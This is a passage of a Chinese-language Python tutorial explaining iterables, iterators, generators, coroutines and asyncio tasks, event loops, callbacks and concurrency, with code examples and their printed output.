class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> collections<br><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> Iterable, Iterator, Generator<br><br><span class="hljs-comment"># 字符串</span><br>tstr = <span class="hljs-string">&quot;MengSec&quot;</span><br>print(<span class="hljs-string">&quot;字符串：&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(tstr))<br>print(<span class="hljs-built_in">isinstance</span>(tstr, Iterable))<br>print(<span class="hljs-built_in">isinstance</span>(tstr, Iterator))<br>print(<span class="hljs-built_in">isinstance</span>(tstr, Generator))<br><br><span class="hljs-comment"># 列表</span><br>tlist = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>print(<span class="hljs-string">&quot;列表：&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(tlist))<br>print(<span class="hljs-built_in">isinstance</span>(tlist, Iterable))<br>print(<span class="hljs-built_in">isinstance</span>(tlist, Iterator))<br>print(<span class="hljs-built_in">isinstance</span>(tlist, Generator))<br><br><span class="hljs-comment"># 字典</span><br>tdict = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;MengChen&quot;</span>&#125;<br>print(<span class="hljs-string">&quot;字典：&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(tdict))<br>print(<span class="hljs-built_in">isinstance</span>(tdict, Iterable))<br>print(<span class="hljs-built_in">isinstance</span>(tdict, Iterator))<br>print(<span class="hljs-built_in">isinstance</span>(tdict, Generator))<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ada">字符串：MengSec<br><span class="hljs-literal">True</span><br><span class="hljs-literal">False</span><br><span class="hljs-literal">False</span><br>列表：[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br><span class="hljs-literal">True</span><br><span class="hljs-literal">False</span><br><span class="hljs-literal">False</span><br>字典：&#123;<span class="hljs-symbol">&#x27;name</span>&#x27;: <span class="hljs-symbol">&#x27;MengChen</span>&#x27;&#125;<br><span class="hljs-literal">True</span><br><span class="hljs-literal">False</span><br><span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>由输出可知，这些对象都是可迭代的，但不是迭代器，也不是生成器。但是它们都可以使用for来循环。</p><blockquote><p>可迭代对象，是其内部实现了<code>__iter__()</code>或者<code>__getitem__()</code>魔术方法。</p></blockquote><h3 id="1-2-迭代器"><a href="#1-2-迭代器" class="headerlink" title="1.2 迭代器"></a>1.2 迭代器</h3><p>与可迭代的对象相比，迭代器其实是在内部多实现了一个<code>__next__()</code>方法，在迭代器中，不仅可以使用<code>for</code>循环来获取元素，也可以使用<code>next()</code>来获取元素。 </p><blockquote><p>迭代器遵循Python的迭代器协议，也就是对象要实现<code>__iter()__</code>和<code>next()</code>方法，在Python3中要实现<code>__next__()</code>， <code>__iter()__</code> 方法返回迭代器对象本身，<code>next()</code>方法返回容器的下一个元素，在没有后续元素时抛出<code>StopIteration</code>异常</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> Iterator<br><br>List = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>] <span class="hljs-comment"># 定义一个可迭代的列表</span><br>print(<span class="hljs-built_in">isinstance</span>(List, Iterator)) <span class="hljs-comment"># 判断是否是迭代器</span><br>List_Iterator = <span class="hljs-built_in">iter</span>(List) <span class="hljs-comment"># 使用iter()方法将其转换为迭代器</span><br>print(<span class="hljs-built_in">isinstance</span>(List_Iterator, Iterator)) <span class="hljs-comment"># 判断是否为迭代器</span><br>print(<span class="hljs-built_in">next</span>(List_Iterator)) <span class="hljs-comment"># 使用next()方法来获取元素</span><br>print(<span class="hljs-built_in">next</span>(List_Iterator))<br>print(<span class="hljs-built_in">next</span>(List_Iterator))<br>print(<span class="hljs-built_in">next</span>(List_Iterator))<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-literal">False</span><br><span class="hljs-literal">True</span><br><span class="hljs-number">1</span><br><span class="hljs-number">2</span><br><span class="hljs-number">3</span><br><span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p><code>Python</code>的<code>for</code>循环实质上是先通过内置函数<code>iter()</code>获得一个迭代器，然后再不断调用<code>next()</code>函数实现的；</p><h3 id="1-3-生成器"><a href="#1-3-生成器" class="headerlink" title="1.3 生成器"></a>1.3 生成器</h3><p>生成器，可以理解为，当需要它其中的元素时，才会经过计算生成该元素。从而在内存中节省大量的空间。<br>迭代器可以使用<code>next()</code>和<code>for</code>来遍历，而生成器是在它的基础上，又实现了一个<code>yield</code>，也可以说生成器是一种特殊的迭代器。<br><code>yield</code>可以理解为一种中断，在每次调用<code>next()</code>时，函数都会中断在<code>yield</code>处，并且返回当前的值。当没有遇到<code>yield</code>时，程序会抛出异常<code>StopIteration</code>。</p><p>创建一个生成器主要有两种办法</p><ol><li>使用列表生成式</li></ol><p>需要注意与列表推导式的区别</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> Iterable, Iterator, Generator<br><br>List1 = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)] <span class="hljs-comment"># 列表推导式</span><br>print(<span class="hljs-built_in">isinstance</span>(List1, Iterable))<br>print(<span class="hljs-built_in">isinstance</span>(List1, Iterator))<br>print(<span class="hljs-built_in">isinstance</span>(List1, Generator))<br>List2 = (x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)) <span class="hljs-comment"># 列表生成式</span><br>print(<span class="hljs-built_in">isinstance</span>(List2, Iterable))<br>print(<span class="hljs-built_in">isinstance</span>(List2, Iterator))<br>print(<span class="hljs-built_in">isinstance</span>(List2, Generator))<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-literal">True</span><br><span class="hljs-literal">False</span><br><span class="hljs-literal">False</span><br><span class="hljs-literal">True</span><br><span class="hljs-literal">True</span><br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><ol start="2"><li>实现<code>yield</code>的函数</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">n</span>):</span><br>    now = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> now &lt; n:<br>        <span class="hljs-keyword">yield</span> now<br>        now += <span class="hljs-number">1</span><br><br>gen = test(<span class="hljs-number">10</span>)<br>print(<span class="hljs-built_in">isinstance</span>(gen, Generator))  <span class="hljs-comment"># 输出True</span><br></code></pre></td></tr></table></figure><p>生成器在其生命周期中，拥有四个状态</p><blockquote><p><code>GEN_CREATED</code> # 等待开始执行<br><code>GEN_RUNNING</code> # 解释器正在执行（只有在多线程应用中才能看到这个状态）<br><code>GEN_SUSPENDED</code> # 在yield表达式处暂停<br><code>GEN_CLOSED</code> # 执行结束</p></blockquote><h3 id="1-4-生成器-gt-协程"><a href="#1-4-生成器-gt-协程" class="headerlink" title="1.4 生成器-&gt;协程"></a>1.4 生成器-&gt;协程</h3><p>在生成器中，使用<code>yield</code>来实现了暂停函数执行的功能，那么在函数暂停执行的时候，是否可以给它发送某些信息呢。这在编程模型上，类似于实现了子程序，经过后面的发展，诞生了协程。</p><p>在维基百科中，协程是这么定义的：</p><blockquote><p>协程是计算机程序的一类组件，推广了非抢先多任务的子程序，允许执行被挂起与被恢复</p></blockquote><p>给暂停中的函数传递信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> Iterable, Iterator, Generator<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">N</span>):</span><br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> index &lt; N:<br>        <span class="hljs-comment"># 通过send()发送的信息将赋值给jump</span><br>        jump = <span class="hljs-keyword">yield</span> index<br>        <span class="hljs-keyword">if</span> jump <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            jump = <span class="hljs-number">1</span><br>        index += jump<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    a = test(<span class="hljs-number">5</span>)<br>    print(<span class="hljs-built_in">next</span>(a)) <span class="hljs-comment"># 0 &lt; 5 在yield处阻塞</span><br>    print(a.send(<span class="hljs-number">2</span>)) <span class="hljs-comment"># 继续往下执行 此时jump == 2。则index = 0 + 2 = 2，然后阻塞</span><br>    print(<span class="hljs-built_in">next</span>(a)) <span class="hljs-comment"># 没有给jump传值，此时jump == 1。index = 2 + 1 = 3，然后阻塞</span><br>    print(a.send(-<span class="hljs-number">3</span>)) <span class="hljs-comment"># 给jump传值为-3，继续往下执行，index = 3 - 3 = 0，此时继续阻塞在yield处，程序结束。</span><br></code></pre></td></tr></table></figure><h2 id="2-协程"><a href="#2-协程" class="headerlink" title="2. 协程"></a>2. 协程</h2><p>在<code>Python3.4</code>中，引入了<code>asyncio</code>这个标准库，它直接内置了对<code>异步IO</code>的支持。</p><h3 id="2-1-如何创建协程"><a href="#2-1-如何创建协程" class="headerlink" title="2.1 如何创建协程"></a>2.1 如何创建协程</h3><p>借助<code>asyncio</code>这个标准库，我们使用<code>async</code>关键字可以很方便的定义或者创建协程(<code>Coroutine</code>)。</p><p>直接上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> Generator, Coroutine<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">a</span>):</span><br>    print(<span class="hljs-string">&quot;hello, &quot;</span> + a)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    coroutine = test(<span class="hljs-string">&quot;MengSec&quot;</span>) <span class="hljs-comment"># 生成一个协程对象</span><br>    print(coroutine)<br>    print(<span class="hljs-built_in">isinstance</span>(coroutine, Generator)) <span class="hljs-comment"># 判断协程是不是生成器</span><br>    print(<span class="hljs-built_in">isinstance</span>(coroutine, Coroutine)) <span class="hljs-comment"># 判断是不是协程</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">&lt;coroutine <span class="hljs-type">object</span> test at <span class="hljs-number">0</span>x106449848&gt;<br><span class="hljs-literal">False</span><br><span class="hljs-literal">True</span><br><span class="hljs-symbol">sys:</span><span class="hljs-number">1</span>: RuntimeWarning: coroutine <span class="hljs-comment">&#x27;test&#x27; was never awaited</span><br></code></pre></td></tr></table></figure><p>可以看到，协程对象<code>coroutine</code>中的函数并没有执行，使用<code>async</code>关键词创建的协程对象不是生成器。而且程序还返回了一个<code>Warning</code>。</p><p>在前面我们知道了，协程是在生成器的基础上实现的。通过<code> @asyncio.coroutine</code>装饰器，可以将一个生成器函数<strong>标记</strong>为协程，可以将其直接当做协程使用，但是它本质上还是一个生成器<code>Generator</code>。</p><p>拿前面的一个例子修改一下，上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> Generator, Coroutine<br><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-meta">@asyncio.coroutine</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">n</span>):</span><br>    now = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> now &lt; n:<br>        <span class="hljs-keyword">yield</span> now<br>        now += <span class="hljs-number">1</span><br><br>generator = test(<span class="hljs-number">10</span>)<br>print(generator)<br>print(<span class="hljs-built_in">isinstance</span>(generator, Generator)) <span class="hljs-comment"># 判断是不是生成器</span><br>print(<span class="hljs-built_in">isinstance</span>(generator, Coroutine)) <span class="hljs-comment"># 判断是不是协程</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-built_in">generator</span> <span class="hljs-keyword">object</span> test at <span class="hljs-number">0x1051ff840</span>&gt;<br><span class="hljs-literal">True</span><br><span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h3 id="2-2-协程是如何工作的"><a href="#2-2-协程是如何工作的" class="headerlink" title="2.2 协程是如何工作的"></a>2.2 协程是如何工作的</h3><p>首先列出在<code>asyncio</code>中贯穿始终的概念</p><ul><li><code>event_loop</code> 事件循环：程序开启一个无限的循环，程序员会把一些函数（协程）注册到事件循环上。当满足事件发生的时候，调用相应的协程函数，事件循环是asyncio的核心。事件循环运行异步任务和回调，执行网络IO操作以及运行子进程。</li><li><code>coroutine</code>协程：协程对象，指一个使用<code>async</code>关键字定义的函数，它的调用不会立即执行函数，而是会返回一个协程对象。协程对象需要注册到事件循环，由事件循环调用。</li><li><code>future</code>对象： 代表将来执行或没有执行的任务的结果。它和<code>task</code>上没有本质的区别</li><li><code>task</code>任务：一个协程对象就是一个原生可以挂起的函数，任务则是对协程进一步封装，其中包含任务的各种状态。<code>Task</code>对象是 <code>Future</code>的子类，它将<code>coroutine</code>和<code>Future</code>联系在一起，将<code>coroutine</code>封装成一个<code>Future</code>对象。</li><li><code>async/await</code>关键字：<code>python3.5</code>中用于定义协程的关键字，<code>async</code>定义一个协程，<code>await</code>用于挂起阻塞的异步调用接口。</li></ul><p>协程的工作流程</p><ol><li>创建一个协程对象</li><li>将协程转换为<code>task</code>任务</li><li>定义<code>event_loop</code>容器</li><li>将<code>task</code>任务放入<code>event_loop</code>容器中触发</li></ol><p>上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">a</span>):</span><br>    print(<span class="hljs-string">&quot;hello, &quot;</span> + a)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    coroutine = test(<span class="hljs-string">&quot;MengSec&quot;</span>) <span class="hljs-comment"># 生成一个协程对象</span><br>    loop = asyncio.get_event_loop() <span class="hljs-comment"># 定义事件循环对象</span><br>    task = loop.create_task(coroutine) <span class="hljs-comment"># 将协程转换为task任务</span><br>    loop.run_until_complete(task) <span class="hljs-comment"># 将task任务扔进事件循环对象中触发</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">hello,</span> MengSec<br></code></pre></td></tr></table></figure><h3 id="2-3-如何获取协程函数的返回值"><a href="#2-3-如何获取协程函数的返回值" class="headerlink" title="2.3 如何获取协程函数的返回值"></a>2.3 如何获取协程函数的返回值</h3><p><code>Task</code>对象是<code>Future</code>对象的子类，它保存了协程函数运行的状态。我们可以通过它来获取协程函数的返回值，具体来说有两种方式</p><h4 id="2-3-1-直接获取Task的结果"><a href="#2-3-1-直接获取Task的结果" class="headerlink" title="2.3.1 直接获取Task的结果"></a>2.3.1 直接获取Task的结果</h4><p>当协程函数运行结束后，我们需要得到其返回值，第一种方式就是等到<code>task</code>状态为<code>finish</code>时，调用<code>task</code>的<code>result</code>方法获取返回值。</p><p>修改一下前面的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">a</span>):</span><br>    print(<span class="hljs-string">&quot;hello, &quot;</span> + a)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Returned value&quot;</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    coroutine = test(<span class="hljs-string">&quot;MengSec&quot;</span>) <span class="hljs-comment"># 生成一个协程对象</span><br>    loop = asyncio.get_event_loop() <span class="hljs-comment"># 定义事件循环对象</span><br>    task = loop.create_task(coroutine) <span class="hljs-comment"># 将协程转换为task任务</span><br>    loop.run_until_complete(task) <span class="hljs-comment"># 将task任务扔进事件循环对象中触发</span><br>    print(task.result()) <span class="hljs-comment"># 直接获得Task执行结束的结果</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">hello,</span> MengSec<br>Returned value<br></code></pre></td></tr></table></figure><h4 id="2-3-2-绑定回调函数"><a href="#2-3-2-绑定回调函数" class="headerlink" title="2.3.2 绑定回调函数"></a>2.3.2 绑定回调函数</h4><p>回调的实现有两种。</p><p>一种是利用同步编程实现的回调。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">a</span>):</span><br>    print(<span class="hljs-string">&quot;执行一个非常耗时的IO操作&quot;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;暂停了&#123;&#125;秒&quot;</span>.<span class="hljs-built_in">format</span>(a)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    coroutine = test(<span class="hljs-string">&quot;2&quot;</span>) <span class="hljs-comment"># 生成一个协程对象</span><br>    loop = asyncio.get_event_loop() <span class="hljs-comment"># 定义事件循环对象</span><br>    task = loop.create_task(coroutine) <span class="hljs-comment"># 将协程转换为task任务</span><br>    loop.run_until_complete(task) <span class="hljs-comment"># 将task任务扔进事件循环对象中触发</span><br>    print(task.result()) <span class="hljs-comment"># 直接获得Task执行结束的结果</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">执行一个非常耗时的IO操作<br>暂停了2秒<br></code></pre></td></tr></table></figure><p>另一种是通过<code>asyncio</code>自带的添加回调函数的功能来实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>(<span class="hljs-params">a</span>):</span><br>    print(<span class="hljs-string">&quot;执行一个非常耗时的IO操作&quot;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;暂停了&#123;&#125;秒&quot;</span>.<span class="hljs-built_in">format</span>(a)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">callback</span>(<span class="hljs-params">future</span>):</span><br>    print(<span class="hljs-string">&quot;正在执行回调函数，获取返回的结果是：&quot;</span>, future.result())<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    coroutine = test(<span class="hljs-string">&quot;2&quot;</span>) <span class="hljs-comment"># 生成一个协程对象</span><br>    loop = asyncio.get_event_loop() <span class="hljs-comment"># 定义事件循环对象</span><br>    task = loop.create_task(coroutine) <span class="hljs-comment"># 将协程转换为task任务</span><br>    task.add_done_callback(callback) <span class="hljs-comment"># 添加回调函数</span><br>    loop.run_until_complete(task) <span class="hljs-comment"># 将task任务扔进事件循环对象中触发</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">执行一个非常耗时的IO操作<br>正在执行回调函数，获取返回的结果是： 暂停了2秒<br></code></pre></td></tr></table></figure><h3 id="2-4-协程中的并发"><a href="#2-4-协程中的并发" class="headerlink" title="2.4 协程中的并发"></a>2.4 协程中的并发</h3><p>首先理解一下并发和并行</p><blockquote><p>并发通常指有多个任务需要同时进行，并行则是同一时刻有多个任务执行。用多线程、多进程、协程来说，协程实现并发，多线程与多进程实现并行</p></blockquote><p><code>asyncio</code>实现并发，就需要多个协程来完成任务，每当有任务阻塞的时候就<code>await</code>，然后其他协程继续工作。</p><p>第一步，创建包含多个协程的列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span> <span class="hljs-comment"># 定义一个协程函数</span><br>    print(<span class="hljs-string">&quot;Before IO...&quot;</span>)<br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>) <span class="hljs-comment"># 假定有一个IO任务，阻塞</span><br>    print(<span class="hljs-string">&quot;After IO...&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;任务执行完毕&quot;</span><br><span class="hljs-comment"># 创建三个协程对象</span><br>a = test()<br>b = test()<br>c = test()<br><span class="hljs-comment"># 将三个协程对象转换为Task对象，并存到list中。</span><br>tasks = [<br>    asyncio.ensure_future(a),<br>    asyncio.ensure_future(b),<br>    asyncio.ensure_future(c),<br>]<br></code></pre></td></tr></table></figure><p>第二步，将这些协程添加到事件循环中。</p><p>同样有两种办法</p><ul><li>使用 <code>asyncio.wait()</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">loop = asyncio.get_event_loop()<br>loop.run_until_complete(asyncio.wait(tasks))<br></code></pre></td></tr></table></figure></li><li>使用 <code>asyncio.gather()</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">loop = asyncio.get_event_loop()<br>loop.run_until_complete(asyncio.gather(*tasks))<br></code></pre></td></tr></table></figure>最后的结果，使用<code>task.result</code>来查看</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:<br>    print(<span class="hljs-string">&quot;任务执行结果为： &quot;</span>, task.result())<br></code></pre></td></tr></table></figure><p>完整代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span> <span class="hljs-comment"># 定义一个协程函数</span><br>    print(<span class="hljs-string">&quot;Before IO...&quot;</span>)<br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>) <span class="hljs-comment"># 假定有一个IO任务，阻塞</span><br>    print(<span class="hljs-string">&quot;After IO...&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;任务执行完毕&quot;</span><br><span class="hljs-comment"># 创建三个协程对象</span><br>a = test()<br>b = test()<br>c = test()<br><span class="hljs-comment"># 将三个协程对象转换为Task对象，并存到list中。</span><br>tasks = [<br>    asyncio.ensure_future(a),<br>    asyncio.ensure_future(b),<br>    asyncio.ensure_future(c),<br>]<br>loop = asyncio.get_event_loop()<br>loop.run_until_complete(asyncio.wait(tasks))<br><span class="hljs-comment"># loop.run_until_complete(asyncio.gather(*tasks))</span><br><span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:<br>    print(<span class="hljs-string">&quot;任务执行结果为： &quot;</span>, task.result())<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">Before</span></span> IO...<br><span class="hljs-function"><span class="hljs-title">Before</span></span> IO...<br><span class="hljs-function"><span class="hljs-title">Before</span></span> IO...<br><span class="hljs-function"><span class="hljs-title">After</span></span> IO...<br><span class="hljs-function"><span class="hljs-title">After</span></span> IO...<br><span class="hljs-function"><span class="hljs-title">After</span></span> IO...<br>任务执行结果为：  